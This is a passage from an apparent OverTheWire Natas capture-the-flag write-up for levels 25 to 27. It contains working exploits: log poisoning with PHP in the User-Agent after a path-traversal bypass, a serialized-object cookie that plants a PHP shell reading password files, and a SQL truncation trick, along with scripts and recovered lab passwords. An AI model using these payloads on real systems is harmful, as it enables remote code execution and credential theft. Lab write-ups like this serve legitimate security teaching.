> [25.10.2024 04::56:32] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::00:19] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::00:19] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::05:19] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::05:19] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::05:33] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::05:33] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::06:02] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::07:37] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::09:40] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::11:26] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::11:26] [UNDISCLOSED] "Illegal file access detected! Aborting!" [25.10.2024 05::16:34] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::17:46] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::17:52] [UNDISCLOSED] "Directory traversal attempt! fixing request." [25.10.2024 05::18:06] [UNDISCLOSED] "Directory traversal attempt! fixing request."

That is interesting.

Moreover, the function `logRequest` writes in the log file the value of `$_SERVER['HTTP_USER_AGENT']`. Can we tamper it?

Using Burp, the base request is:

```
GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Cookie: PHPSESSID=04mg3fhcld4h0i63i2b500cjgo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

We can execute system commands in PHP using `exec`, as [here](https://www.php.net/manual/en/function.exec.php) explained:

```php
<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('whoami', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
```

We replace the User Agent with `User-Agent: <?php echo exec('whoami');?>` getting:

```
GET /?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_04mg3fhcld4h0i63i2b500cjgo.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php echo exec('whoami');?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNTpja0VMS1VXWlVmcE92NnV4UzZNN2xYQnBCc3NKWjRXcw==
Connection: keep-alive
Cookie: PHPSESSID=04mg3fhcld4h0i63i2b500cjgo
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

In the logs:

```
[25.10.2024 05::32:52] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE "Directory traversal attempt! fixing request."
```

When understood, this whole process can be automated in a script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas25', 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws')

url = "http://natas25.natas.labs.overthewire.org/"


def send_request() -> str:
    first_url = url + f"?lang=de"
    print(f"Sending request to [{first_url}]...")
    user_agent = "<?php echo shell_exec('cat /etc/natas_webpass/natas26');?>"
    headers = {'Content-Type': 'text/html; charset=UTF-8',
               'User-Agent': user_agent}
    session = requests.Session()
    _ = session.get(first_url,
                    headers=headers,
                    auth=basic_auth,
                    verify=False)
    session_id = session.cookies.get_dict()['PHPSESSID']
    second_url = url + \
        f"?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_{session_id}.log"
    response = session.get(second_url,
                           headers=headers,
                           auth=basic_auth,
                           verify=False)
    return response.text


if __name__ == '__main__':
    print(send_request())
```

## Natas 26

### Credentials

Username: natas26
Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
URL: http://natas26.natas.labs.overthewire.org

### Message

The page says:

> Draw a line:

and requires X1, Y1, X2, Y2.

There is a link to the source code.

### Solution

The source code linked:

```html
<html>
  <head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link
      rel="stylesheet"
      type="text/css"
      href="http://natas.labs.overthewire.org/css/level.css"
    />
    <link
      rel="stylesheet"
      href="http://natas.labs.overthewire.org/css/jquery-ui.css"
    />
    <link
      rel="stylesheet"
      href="http://natas.labs.overthewire.org/css/wechall.css"
    />
    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
    <script>
      var wechallinfo = { level: "natas26", pass: "<censored>" };
    </script>
  </head>
  <body>
    <?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n"; $this->exitMsg="#--session
    end--#\n"; $this->logFile = "/tmp/natas26_" . $file . ".log"; // write
    initial message $fd=fopen($this->logFile,"a+"); fwrite($fd,$this->initMsg);
    fclose($fd); } function log($msg){ $fd=fopen($this->logFile,"a+");
    fwrite($fd,$msg."\n"); fclose($fd); } function __destruct(){ // write exit
    message $fd=fopen($this->logFile,"a+"); fwrite($fd,$this->exitMsg);
    fclose($fd); } } function showImage($filename){ if(file_exists($filename))
    echo "<img src=\"$filename\">"; } function drawImage($filename){
    $img=imagecreatetruecolor(400,300); drawFromUserdata($img);
    imagepng($img,$filename); imagedestroy($img); } function
    drawFromUserdata($img){ if( array_key_exists("x1", $_GET) &&
    array_key_exists("y1", $_GET) && array_key_exists("x2", $_GET) &&
    array_key_exists("y2", $_GET)){
    $color=imagecolorallocate($img,0xff,0x12,0x1c); imageline($img,$_GET["x1"],
    $_GET["y1"], $_GET["x2"], $_GET["y2"], $color); } if
    (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"])); if($drawing)
    foreach($drawing as $object) if( array_key_exists("x1", $object) &&
    array_key_exists("y1", $object) && array_key_exists("x2", $object) &&
    array_key_exists("y2", $object)){
    $color=imagecolorallocate($img,0xff,0x12,0x1c);
    imageline($img,$object["x1"],$object["y1"], $object["x2"] ,$object["y2"]
    ,$color); } } } function storeData(){ $new_object=array();
    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
    array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
    $new_object["x1"]=$_GET["x1"]; $new_object["y1"]=$_GET["y1"];
    $new_object["x2"]=$_GET["x2"]; $new_object["y2"]=$_GET["y2"]; } if
    (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"])); } else{ // create
    new array $drawing=array(); } $drawing[]=$new_object;
    setcookie("drawing",base64_encode(serialize($drawing))); } ?>

    <h1>natas26</h1>
    <div id="content">
      Draw a line:<br />
      <form name="input" method="get">
        X1<input type="text" name="x1" size="2" /> Y1<input
          type="text"
          name="y1"
          size="2"
        />
        X2<input type="text" name="x2" size="2" /> Y2<input
          type="text"
          name="y2"
          size="2"
        />
        <input type="submit" value="DRAW!" />
      </form>

      <?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>

      <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
    </div>
  </body>
</html>
```

In particular, the PHP part:

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla

    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";

            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->initMsg);
            fclose($fd);
        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);
        imagedestroy($img);
    }

    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){

            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"],
                            $_GET["x2"], $_GET["y2"], $color);
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) &&
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) &&
                        array_key_exists("y2", $object)){

                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);

                    }
        }
    }

    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
```

and

```php
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```

Inserting X1, Y1, X2 and Y2, the request goes to `http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2`. There is a cookie called `drawing` with value (e.g.) `YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjIiO319` and another called `PHPSESSID` with value `0o8fjas5n6i6f4l8jgipiegq9l`.

Reading the code, notice in the function `drawFromUserdata`:

```php
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    if($drawing)
        foreach($drawing as $object)
            if( array_key_exists("x1", $object) &&
                array_key_exists("y1", $object) &&
                array_key_exists("x2", $object) &&
                array_key_exists("y2", $object)){

                $color=imagecolorallocate($img,0xff,0x12,0x1c);
                imageline($img,$object["x1"],$object["y1"],
                        $object["x2"] ,$object["y2"] ,$color);

            }
}
```

Thus the cookie `drawing` is base 64 encoded data! Decode it using [CyberChef](https://cyberchef.org/) or the command `base64` and get:

```
YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czoxOiIyIjtzOjI6InkyIjtzOjE6IjIiO319
```

is

```
a:1:{i:0;a:4:{s:2:"x1";s:1:"1";s:2:"y1";s:1:"1";s:2:"x2";s:1:"2";s:2:"y2";s:1:"2";}}
```

```php
<?php

class Logger {
    private $logFile;
    private $exitMsg;

    function __construct() {
        $this->exitMsg = "<?php echo exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_[SESSION_ID].php";
    }
}

$logger = new Logger();

echo base64_encode(serialize($logger));
?>
```

This produces base 64 encoded data.

Replace the `drawing` cookie with this data and then visit `http://natas26.natas.labs.overthewire.org/img/natas26_[SESSION_ID].php`.

Visit `http://natas26.natas.labs.overthewire.org/img/natas26_[SESSION_ID].php`.

Given the session ID `rnhdh9ujn7qlaur1nf17umi8ec`,

```php
<?php

class Logger {
    private $logFile;
    private $exitMsg;

    function __construct() {
        $this->exitMsg = "<?php echo exec('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "/var/www/natas/natas26/img/natas26_rnhdh9ujn7qlaur1nf17umi8ec.php";
    }
}

$logger = new Logger();

echo base64_encode(serialize($logger));
?>
```

This produces the output `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl9ybmhkaDl1am43cWxhdXIxbmYxN3VtaThlYy5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MzoiPD9waHAgZWNobyBleGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30=`,
which we set in `drawing`. Draw something specifying the coordinates as required.

Visit `http://natas26.natas.labs.overthewire.org/img/natas26_rnhdh9ujn7qlaur1nf17umi8ec.php`.

This gives the value `u3RRffXjysjgwFU6b9xa23i6prmUsYne`.

## Natas 27

### Credentials

Username: natas27
Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
URL: http://natas27.natas.labs.overthewire.org

### Message

The page requires a username and a password.

There is a link to the source code.

### Solution

Inserting a username and a password, a POST request is made to `http://natas27.natas.labs.overthewire.org/index.php` with body:

```
username=asd&password=dsa
```

It seems that this creates a user:

> User asd was created!

The page source code is the following:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The PHP code:

```php
<?php

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
```

In particular, there is a SQL database with table `users` defined as:

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

A function checks the credentials:

```php

function checkCredentials($link,$usr,$pass){

    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysqli_query($link, $query);
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}
```

Another function validates the user:

```php
function validUser($link,$usr){

    $user=mysqli_real_escape_string($link, $usr);

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```

There is an interesting function that returns all the columns for a given user:

```php
function dumpData($link,$usr){

    $user=mysqli_real_escape_string($link, trim($usr));

    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            while ($row = mysqli_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}
```

Finally, a function to create a user:

```php
function createUser($link, $usr, $pass){

    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysqli_query($link, $query);
    if(mysqli_affected_rows($link) > 0){
        return True;
    }
    return False;
}
```

The main function defines the flow:

```php

if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');


    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<?php } ?>
```

Inserting again the credentials for the user `asd` (`asd:dsa`) as above:

> Welcome asd!
> Here is your data:
> Array ( [username] => asd [password] => dsa )

Inserting a wrong password:

> Wrong password for user: asd

If we try with the user `natas28` and the password `asd` we get:

> Wrong password for user: natas28

Craft and use the following script:

```python
import requests
from requests.auth import HTTPBasicAuth

basic_auth = ('natas27', 'u3RRffXjysjgwFU6b9xa23i6prmUsYne')

url = "http://natas27.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}


def send_request(session, username, password) -> str:
    body = {"username": username, "password": password}
    response = session.post(url,
                    headers=headers,
                    data=body)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    natas28 = "natas28"
    padding = " " * (64 - len(natas28))
    username = natas28 + padding
    password = ""
    print(send_request(session, username + "x", password))
    print(send_request(session, username, password))
```

This gives in the output:

> Welcome natas28 !<br>Here is your data:<br>Array
> (
> [username] =&gt; natas28
> [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
> )

## Natas 27

### Credentials

Username: natas28
Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
URL: http://natas28.natas.labs.overthewire.org

### Message

### Solution
